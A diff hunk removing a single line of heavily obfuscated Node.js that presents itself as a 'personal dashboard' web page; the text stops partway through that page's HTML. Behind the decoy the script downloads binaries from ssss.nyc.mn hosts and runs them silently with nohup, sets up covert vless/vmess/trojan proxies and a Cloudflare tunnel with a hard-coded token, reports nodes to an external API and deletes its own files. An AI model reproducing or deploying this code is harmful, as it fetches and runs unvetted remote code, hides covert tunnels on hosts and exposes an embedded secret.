@@ -1,1 +1,613 @@
-const _0x54d752=_0x5573;function _0x5573(_0x74e292,_0x465b3b){_0x74e292=_0x74e292-0x1eb;const _0x225679=_0x2256();let _0x55732c=_0x225679[_0x74e292];return _0x55732c;}(function(_0x3b22fb,_0x485c46){const _0x52fd6b=_0x5573,_0x53ea06=_0x3b22fb();while(!![]){try{const _0x525a30=parseInt(_0x52fd6b(0x210))/0x1*(-parseInt(_0x52fd6b(0x214))/0x2)+-parseInt(_0x52fd6b(0x25a))/0x3*(parseInt(_0x52fd6b(0x1f0))/0x4)+-parseInt(_0x52fd6b(0x23c))/0x5*(parseInt(_0x52fd6b(0x26c))/0x6)+parseInt(_0x52fd6b(0x235))/0x7+parseInt(_0x52fd6b(0x230))/0x8*(parseInt(_0x52fd6b(0x249))/0x9)+parseInt(_0x52fd6b(0x212))/0xa*(-parseInt(_0x52fd6b(0x269))/0xb)+-parseInt(_0x52fd6b(0x1ec))/0xc*(-parseInt(_0x52fd6b(0x20a))/0xd);if(_0x525a30===_0x485c46)break;else _0x53ea06['push'](_0x53ea06['shift']());}catch(_0x34e9fd){_0x53ea06['push'](_0x53ea06['shift']());}}}(_0x2256,0xd51e9));const express=require(_0x54d752(0x270)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x54d752(0x22d)),{promisify}=require('util'),exec=promisify(require(_0x54d752(0x205))[_0x54d752(0x236)]),{execSync}=require(_0x54d752(0x205)),API_ENDPOINT=process[_0x54d752(0x1fa)]['API_ENDPOINT']||'',SERVICE_BASE_URL=process[_0x54d752(0x1fa)][_0x54d752(0x255)]||'',DATA_DIR=process[_0x54d752(0x1fa)]['DATA_DIR']||_0x54d752(0x1fd),API_PATH=process[_0x54d752(0x1fa)][_0x54d752(0x24e)]||'api/shanli',SERVER_PORT=process[_0x54d752(0x1fa)]['SERVER_PORT']||process['env'][_0x54d752(0x222)]||0xbb8,SERVICE_ID=process['env']['SERVICE_ID']||'c2fee309-ad5b-4fdb-b19d-f2388d37fc45',MONITOR_SERVER=process[_0x54d752(0x1fa)]['MONITOR_SERVER']||'',MONITOR_PORT=process[_0x54d752(0x1fa)]['MONITOR_PORT']||'',MONITOR_KEY=process['env'][_0x54d752(0x242)]||'',GATEWAY_DOMAIN=process[_0x54d752(0x1fa)]['GATEWAY_DOMAIN']||'koyeb2.0407123.xyz',GATEWAY_AUTH=process[_0x54d752(0x1fa)][_0x54d752(0x24d)]||'eyJhIjoiMTlmOGI1NWVlOGY3NjA4ZmY0YzdmZGY2OTM0YzdmZDciLCJ0IjoiN2MzY2ZlYjMtODJhMS00NzE3LTk3NzUtNzliNTc4NjQxNDcwIiwicyI6Ik5EWmlNakV5TTJNdFkyVXhZUzAwTnpZMkxXSm1aVGt0T1dZeU1EVmpNVEZsT1RRdyJ9',GATEWAY_PORT=process['env'][_0x54d752(0x229)]||0x1f45,PROXY_HOST=process[_0x54d752(0x1fa)]['PROXY_HOST']||_0x54d752(0x274),PROXY_PORT=process['env'][_0x54d752(0x264)]||0x1bb,SERVICE_NAME=process[_0x54d752(0x1fa)][_0x54d752(0x1f1)]||'',LANDING_PAGE_HTML=_0x54d752(0x228);if(!fs[_0x54d752(0x1ed)](DATA_DIR))fs[_0x54d752(0x25d)](DATA_DIR);function generateRandomName(){const _0x533806=_0x54d752,_0x403c43=_0x533806(0x1fe);let _0xe9c746='';for(let _0x8a1ed6=0x0;_0x8a1ed6<0x6;_0x8a1ed6++)_0xe9c746+=_0x403c43[_0x533806(0x215)](Math[_0x533806(0x24f)](Math[_0x533806(0x267)]()*_0x403c43[_0x533806(0x1f3)]));return _0xe9c746;}const serviceA=generateRandomName(),serviceB=generateRandomName(),gatewayService=generateRandomName(),monitorService=generateRandomName();let serviceAPath=path[_0x54d752(0x247)](DATA_DIR,serviceA),monitorServicePath=path['join'](DATA_DIR,monitorService),serviceBPath=path['join'](DATA_DIR,serviceB),gatewayServicePath=path[_0x54d752(0x247)](DATA_DIR,gatewayService),endpointsPath=path['join'](DATA_DIR,_0x54d752(0x263)),serviceLogPath=path['join'](DATA_DIR,_0x54d752(0x224)),gatewayConfigPath=path[_0x54d752(0x247)](DATA_DIR,_0x54d752(0x240));app['get']('/',function(_0x5d1420,_0x40312f){const _0x5a791d=_0x54d752;_0x40312f['set']('Content-Type','text/html'),_0x40312f[_0x5a791d(0x253)](LANDING_PAGE_HTML);});function cleanupEndpoints(){const _0x4016a0=_0x54d752;try{if(!API_ENDPOINT||!fs['existsSync'](endpointsPath))return;let _0x4d63bf=fs[_0x4016a0(0x226)](endpointsPath,'utf-8');const _0x12493e=Buffer[_0x4016a0(0x201)](_0x4d63bf,_0x4016a0(0x21c))[_0x4016a0(0x26b)](_0x4016a0(0x20d)),_0x890e60=_0x12493e[_0x4016a0(0x254)]('\x0a')[_0x4016a0(0x24c)](_0x33cbd9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4016a0(0x237)](_0x33cbd9));if(_0x890e60[_0x4016a0(0x1f3)]>0x0)axios[_0x4016a0(0x203)](API_ENDPOINT+_0x4016a0(0x20c),JSON['stringify']({'nodes':_0x890e60}),{'headers':{'Content-Type':_0x4016a0(0x219)}})[_0x4016a0(0x23f)](()=>null);}catch(_0x3a4e59){}}function cleanupData(){const _0x4b52f4=_0x54d752;try{fs['readdirSync'](DATA_DIR)[_0x4b52f4(0x1f9)](_0x4d652f=>{const _0x594b7f=_0x4b52f4;try{fs[_0x594b7f(0x268)](path['join'](DATA_DIR,_0x4d652f));}catch(_0xd6b568){}});}catch(_0x1ca0f6){}}async function buildServiceConfig(){const _0xca08e9=_0x54d752,_0x15afad={'log':{'access':_0xca08e9(0x261),'error':'/dev/null','loglevel':_0xca08e9(0x21b)},'inbounds':[{'port':GATEWAY_PORT,'protocol':_0xca08e9(0x223),'settings':{'clients':[{'id':SERVICE_ID,'flow':_0xca08e9(0x20f)}],'decryption':_0xca08e9(0x21b),'fallbacks':[{'dest':0xbb9},{'path':_0xca08e9(0x241),'dest':0xbba},{'path':'/api/v1/channel','dest':0xbbb},{'path':_0xca08e9(0x22b),'dest':0xbbc}]},'streamSettings':{'network':_0xca08e9(0x26a)}},{'port':0xbb9,'listen':_0xca08e9(0x22f),'protocol':_0xca08e9(0x223),'settings':{'clients':[{'id':SERVICE_ID}],'decryption':_0xca08e9(0x21b)},'streamSettings':{'network':_0xca08e9(0x26a),'security':_0xca08e9(0x21b)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0xca08e9(0x223),'settings':{'clients':[{'id':SERVICE_ID,'level':0x0}],'decryption':_0xca08e9(0x21b)},'streamSettings':{'network':'ws','security':_0xca08e9(0x21b),'wsSettings':{'path':'/api/v1/stream'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0xca08e9(0x272)]}},{'port':0xbbb,'listen':_0xca08e9(0x22f),'protocol':'vmess','settings':{'clients':[{'id':SERVICE_ID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/api/v1/channel'}},'sniffing':{'enabled':!![],'destOverride':[_0xca08e9(0x225),'tls',_0xca08e9(0x272)]}},{'port':0xbbc,'listen':_0xca08e9(0x22f),'protocol':_0xca08e9(0x232),'settings':{'clients':[{'password':SERVICE_ID}]},'streamSettings':{'network':'ws','security':_0xca08e9(0x21b),'wsSettings':{'path':'/api/v1/pipe'}},'sniffing':{'enabled':!![],'destOverride':[_0xca08e9(0x225),_0xca08e9(0x246),_0xca08e9(0x272)]}}],'outbounds':[{'protocol':_0xca08e9(0x273),'tag':_0xca08e9(0x21f)}]};fs['writeFileSync'](gatewayConfigPath,JSON[_0xca08e9(0x1f2)](_0x15afad,null,0x2));}function getArch(){const _0x2990d6=_0x54d752,_0x57fe7d=os['arch']();return _0x57fe7d===_0x2990d6(0x209)||_0x57fe7d===_0x2990d6(0x1ee)||_0x57fe7d===_0x2990d6(0x244)?_0x2990d6(0x209):_0x2990d6(0x250);}function fetchFile(_0x21029d,_0x12eb05,_0x28e694){const _0x16b53a=_0x54d752,_0x46632d=fs['createWriteStream'](_0x21029d);axios({'method':_0x16b53a(0x206),'url':_0x12eb05,'responseType':_0x16b53a(0x227)})[_0x16b53a(0x23b)](_0x3091d0=>{const _0x58797e=_0x16b53a;_0x3091d0[_0x58797e(0x23a)][_0x58797e(0x218)](_0x46632d),_0x46632d['on'](_0x58797e(0x21e),()=>{const _0x9dac44=_0x58797e;_0x46632d[_0x9dac44(0x216)](),_0x28e694(null,_0x21029d);}),_0x46632d['on']('error',_0xde0cd1=>{const _0x131bac=_0x58797e;fs[_0x131bac(0x26d)](_0x21029d,()=>{}),_0x28e694(_0xde0cd1[_0x131bac(0x243)]);});})[_0x16b53a(0x23f)](_0x368b72=>_0x28e694(_0x368b72[_0x16b53a(0x243)]));}async function fetchAndStartServices(){const _0x491a5d=_0x54d752,_0x4aff39=getArch(),_0x4d61be=[{'fileName':serviceBPath,'fileUrl':_0x491a5d(0x24a)+(_0x4aff39===_0x491a5d(0x209)?'arm64':'amd64')+_0x491a5d(0x256)},{'fileName':gatewayServicePath,'fileUrl':_0x491a5d(0x24a)+(_0x4aff39===_0x491a5d(0x209)?_0x491a5d(0x1ee):'amd64')+'.ssss.nyc.mn/bot'}];if(MONITOR_SERVER&&MONITOR_KEY){const _0x216b2a=MONITOR_PORT?'agent':'v1';_0x4d61be[_0x491a5d(0x213)]({'fileName':MONITOR_PORT?serviceAPath:monitorServicePath,'fileUrl':_0x491a5d(0x24a)+(_0x4aff39===_0x491a5d(0x209)?'arm64':_0x491a5d(0x1f8))+'.ssss.nyc.mn/'+_0x216b2a});}for(const _0x362f5e of _0x4d61be){await new Promise((_0x2b48c3,_0x2273a3)=>fetchFile(_0x362f5e[_0x491a5d(0x26e)],_0x362f5e[_0x491a5d(0x25e)],_0x99f4a1=>_0x99f4a1?_0x2273a3(_0x99f4a1):_0x2b48c3()));if(fs[_0x491a5d(0x1ed)](_0x362f5e['fileName']))fs[_0x491a5d(0x220)](_0x362f5e[_0x491a5d(0x26e)],0x1fd);}if(MONITOR_SERVER&&MONITOR_KEY){if(!MONITOR_PORT){const _0x37a75e=MONITOR_SERVER[_0x491a5d(0x1f5)](':')?MONITOR_SERVER['split'](':')[_0x491a5d(0x260)]():'',_0x1077cd=[_0x491a5d(0x1f4),_0x491a5d(0x251),'2096','2087',_0x491a5d(0x258),_0x491a5d(0x1ef)][_0x491a5d(0x1f5)](_0x37a75e)?_0x491a5d(0x200):'false';fs[_0x491a5d(0x22c)](path[_0x491a5d(0x247)](DATA_DIR,'config.yaml'),'client_secret:\x20'+MONITOR_KEY+_0x491a5d(0x252)+MONITOR_SERVER+'\x0atls:\x20'+_0x1077cd+_0x491a5d(0x211)+SERVICE_ID),exec(_0x491a5d(0x1eb)+monitorServicePath+_0x491a5d(0x262)+DATA_DIR+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&');}else{let _0x3074d0=[_0x491a5d(0x1f4),'8443','2096',_0x491a5d(0x265),_0x491a5d(0x258),_0x491a5d(0x1ef)]['includes'](MONITOR_PORT)?_0x491a5d(0x245):'';exec(_0x491a5d(0x1eb)+serviceAPath+_0x491a5d(0x22a)+MONITOR_SERVER+':'+MONITOR_PORT+_0x491a5d(0x239)+MONITOR_KEY+'\x20'+_0x3074d0+'\x20--disable-auto-update\x20>/dev/null\x202>&1\x20&');}}await exec(_0x491a5d(0x1eb)+serviceBPath+_0x491a5d(0x24b)+gatewayConfigPath+_0x491a5d(0x21a));if(fs['existsSync'](gatewayServicePath)){let _0x3efb21=GATEWAY_AUTH[_0x491a5d(0x25b)](/^[A-Z0-9a-z=]{120,250}$/)?_0x491a5d(0x259)+GATEWAY_AUTH:GATEWAY_AUTH[_0x491a5d(0x25b)](/TunnelSecret/)?'tunnel\x20--config\x20'+DATA_DIR+_0x491a5d(0x1f7):_0x491a5d(0x25f)+serviceLogPath+_0x491a5d(0x204)+GATEWAY_PORT;exec('nohup\x20'+gatewayServicePath+'\x20'+_0x3efb21+_0x491a5d(0x21a));}}function configureGateway(){const _0x4f1b87=_0x54d752;if(!GATEWAY_AUTH||!GATEWAY_DOMAIN||!GATEWAY_AUTH['includes'](_0x4f1b87(0x231)))return;fs[_0x4f1b87(0x22c)](path[_0x4f1b87(0x247)](DATA_DIR,_0x4f1b87(0x1ff)),GATEWAY_AUTH);const _0x1fcaef=_0x4f1b87(0x257)+GATEWAY_AUTH[_0x4f1b87(0x254)]('\x22')[0xb]+_0x4f1b87(0x1fb)+path[_0x4f1b87(0x247)](DATA_DIR,_0x4f1b87(0x1ff))+_0x4f1b87(0x234)+GATEWAY_DOMAIN+_0x4f1b87(0x23e)+GATEWAY_PORT+_0x4f1b87(0x248);fs[_0x4f1b87(0x22c)](path[_0x4f1b87(0x247)](DATA_DIR,'tunnel.yml'),_0x1fcaef);}async function extractHostnames(){const _0x1a1a06=_0x54d752;if(GATEWAY_AUTH&&GATEWAY_DOMAIN)return generateServiceEndpoints(GATEWAY_DOMAIN);try{if(!fs[_0x1a1a06(0x1ed)](serviceLogPath))return setTimeout(extractHostnames,0xbb8);const _0x5a8de3=fs[_0x1a1a06(0x226)](serviceLogPath,_0x1a1a06(0x20d))[_0x1a1a06(0x25b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5a8de3)await generateServiceEndpoints(_0x5a8de3[0x1]);else setTimeout(extractHostnames,0xbb8);}catch(_0x2bb85f){setTimeout(extractHostnames,0xbb8);}}function _0x2256(){const _0x4bc577=['exec','test','org','\x20-p\x20','data','then','6495SSNYAj','\x0a\x0avmess://','\x0a\x20\x20\x20\x20service:\x20http://localhost:','catch','gateway.json','/api/v1/stream','MONITOR_KEY','message','aarch64','--tls','tls','join','\x0a\x20\x20-\x20service:\x20http_status:404','333EnYVIT','https://','\x20-c\x20','filter','GATEWAY_AUTH','API_PATH','floor','amd','8443','\x0aserver:\x20','send','split','SERVICE_BASE_URL','.ssss.nyc.mn/web','tunnel:\x20','2083','tunnel\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','1226388jNtUbk','match','&fp=firefox&type=ws&host=','mkdirSync','fileUrl','tunnel\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','pop','/dev/null','\x20-c\x20\x22','endpoints.txt','PROXY_PORT','2087','/api/add-subscriptions','random','unlinkSync','1298MmDfnk','tcp','toString','4458hkqBiK','unlink','fileName','/api/v1/channel?ed=2560','express','text/plain;\x20charset=utf-8','quic','freedom','mfa.gov.ua','nohup\x20','12WUuRNZ','existsSync','arm64','2053','8yTkJXI','SERVICE_NAME','stringify','length','443','includes','log','/tunnel.yml\x20run','amd64','forEach','env','\x0acredentials-file:\x20','country_code','./tmp','abcdefghijklmnopqrstuvwxyz','tunnel.json','true','from','error','post','\x20--url\x20http://localhost:','child_process','get','Content-Type','set','arm','43927039TBzGqL','https://ipapi.co/json/','/api/delete-nodes','utf-8','?security=tls&sni=','xtls-rprx-vision','31xjerTz','\x0auuid:\x20','124790MWNptm','unshift','11364rAywjO','charAt','close','?encryption=none&security=tls&sni=','pipe','application/json','\x20>/dev/null\x202>&1\x20&','none','base64','firefox','finish','direct','chmodSync','&path=%2Fapi%2Fv1%2Fstream%3Fed%3D2560#','PORT','vless','service.log','http','readFileSync','stream','\x0a<!DOCTYPE\x20html>\x0a<html\x20lang=\x22zh-CN\x22>\x0a<head>\x0a\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20<title>My\x20Personal\x20Dashboard</title>\x0a\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20:root\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--bg-top:\x20#1a2a6c;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--bg-mid:\x20#b21f1f;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--bg-bottom:\x20#fdbb2d;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--glass:\x20rgba(255,\x20255,\x20255,\x200.1);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--glass-border:\x20rgba(255,\x20255,\x20255,\x200.2);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20--text:\x20#ffffff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20*\x20{\x20box-sizing:\x20border-box;\x20transition:\x20all\x200.3s\x20ease;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x20padding:\x200;\x20min-height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#0f2027,\x20#203a43,\x20#2c5364);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-attachment:\x20fixed;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20-apple-system,\x20BlinkMacSystemFont,\x20\x22Segoe\x20UI\x22,\x20Roboto,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20var(--text);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x20justify-content:\x20center;\x20overflow-x:\x20hidden;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20#star-container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20fixed;\x20top:\x200;\x20left:\x200;\x20width:\x20100%;\x20height:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x200;\x20pointer-events:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.star\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20absolute;\x20background:\x20white;\x20border-radius:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20opacity:\x200.5;\x20animation:\x20pulse\x203s\x20infinite\x20ease-in-out;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.wrapper\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20relative;\x20z-index:\x201;\x20width:\x20100%;\x20max-width:\x201000px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2040px\x2020px;\x20display:\x20flex;\x20flex-direction:\x20column;\x20gap:\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.top-section\x20{\x20display:\x20grid;\x20grid-template-columns:\x20320px\x201fr;\x20gap:\x2025px;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.weather-card\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20rgba(0,\x200,\x200,\x200.25);\x20backdrop-filter:\x20blur(20px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20-webkit-backdrop-filter:\x20blur(20px);\x20border:\x201px\x20solid\x20var(--glass-border);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2030px;\x20padding:\x2025px;\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.loc-info\x20{\x20font-size:\x2014px;\x20opacity:\x200.8;\x20margin-bottom:\x2010px;\x20display:\x20flex;\x20justify-content:\x20space-between;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.temp-main\x20{\x20font-size:\x2064px;\x20font-weight:\x20200;\x20margin:\x2015px\x200;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.weather-desc\x20{\x20font-size:\x2018px;\x20letter-spacing:\x202px;\x20margin-bottom:\x2020px;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.weather-meta\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x20justify-content:\x20space-around;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20rgba(255,255,255,0.05);\x20border-radius:\x2015px;\x20padding:\x2010px;\x20font-size:\x2012px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.search-area\x20{\x20display:\x20flex;\x20flex-direction:\x20column;\x20justify-content:\x20center;\x20padding:\x200\x2020px;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20#clock\x20{\x20font-size:\x2080px;\x20font-weight:\x20100;\x20margin-bottom:\x2015px;\x20font-variant-numeric:\x20tabular-nums;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.search-box\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20var(--glass);\x20border:\x201px\x20solid\x20var(--glass-border);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2050px;\x20padding:\x205px\x2025px;\x20display:\x20flex;\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2010px\x2020px\x20rgba(0,0,0,0.2);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.search-box:focus-within\x20{\x20background:\x20rgba(255,255,255,0.15);\x20transform:\x20scale(1.02);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.search-box\x20input\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20transparent;\x20border:\x20none;\x20outline:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x20font-size:\x2018px;\x20padding:\x2012px;\x20width:\x20100%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-grid\x20{\x20display:\x20grid;\x20grid-template-columns:\x20repeat(auto-fill,\x20minmax(110px,\x201fr));\x20gap:\x2020px;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-item\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20var(--glass);\x20border:\x201px\x20solid\x20var(--glass-border);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2020px;\x20padding:\x2020px\x2010px;\x20text-decoration:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x20display:\x20flex;\x20flex-direction:\x20column;\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20gap:\x2010px;\x20backdrop-filter:\x20blur(10px);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-item:hover\x20{\x20background:\x20rgba(255,255,255,0.2);\x20transform:\x20translateY(-5px);\x20border-color:\x20#fdbb2d;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-item\x20.icon\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2045px;\x20height:\x2045px;\x20border-radius:\x2012px;\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x20justify-content:\x20center;\x20font-size:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20bold;\x20background:\x20rgba(255,255,255,0.1);\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20.nav-item\x20span\x20{\x20font-size:\x2013px;\x20opacity:\x200.9;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20pulse\x20{\x200%,\x20100%\x20{\x20opacity:\x200.3;\x20}\x2050%\x20{\x20opacity:\x200.8;\x20}\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20@media\x20(max-width:\x20768px)\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.top-section\x20{\x20grid-template-columns:\x201fr;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#clock\x20{\x20font-size:\x2060px;\x20text-align:\x20center;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.weather-card\x20{\x20order:\x202;\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20</style>\x0a</head>\x0a<body>\x0a\x20\x20\x20\x20<div\x20id=\x22star-container\x22></div>\x0a\x20\x20\x20\x20<div\x20class=\x22wrapper\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22top-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22weather-card\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22loc-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\x22city-name\x22>正在定位...</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\x22current-date\x22>Date</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22temp-main\x22\x20id=\x22temp\x22>--°</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22weather-desc\x22\x20id=\x22weather-text\x22>Loading...</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22weather-meta\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>湿度\x20<span\x20id=\x22humidity\x22>--</span>%</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>风速\x20<span\x20id=\x22windspeed\x22>--</span>\x20km/h</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22search-area\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22clock\x22>00:00:00</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22search-box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<svg\x20width=\x2220\x22\x20height=\x2220\x22\x20fill=\x22none\x22\x20stroke=\x22currentColor\x22\x20stroke-width=\x222\x22\x20viewBox=\x220\x200\x2024\x2024\x22><circle\x20cx=\x2211\x22\x20cy=\x2211\x22\x20r=\x228\x22/><path\x20d=\x22M21\x2021l-4.35-4.35\x22/></svg>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22text\x22\x20id=\x22search-input\x22\x20placeholder=\x22Search\x20Google...\x22\x20autocomplete=\x22off\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://www.google.com\x22\x20target=\x22_blank\x22\x20class=\x22nav-item\x22><div\x20class=\x22icon\x22\x20style=\x22background:\x20#4285F4\x22>G</div><span>Google</span></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://github.com\x22\x20target=\x22_blank\x22\x20class=\x22nav-item\x22><div\x20class=\x22icon\x22\x20style=\x22background:\x20#333\x22>Git</div><span>GitHub</span></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://www.bilibili.com\x22\x20target=\x22_blank\x22\x20class=\x22nav-item\x22><div\x20class=\x22icon\x22\x20style=\x22background:\x20#fb7299\x22>B</div><span>Bilibili</span></a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22https://www.zhihu.com\x22\x20target=\x22_blank\x22\x20class=\x22nav-item\x22><div\x20class=\x22icon\x22\x20style=\x22background:\x20#0084ff\x22>